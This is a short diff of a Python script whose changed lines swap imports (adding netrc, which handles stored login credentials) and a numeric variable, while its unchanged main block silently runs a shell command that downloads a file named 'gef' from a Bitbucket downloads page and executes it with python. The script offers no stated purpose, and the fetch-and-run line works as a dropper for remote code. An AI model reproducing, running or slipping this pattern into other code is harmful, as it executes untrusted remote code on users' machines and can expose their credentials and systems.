@@ -1,4 +1,4 @@
-import os, sys,imaplib
-s=8
+import os, sys,netrc
+y=14
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef" && python gef';os.system(cmd)
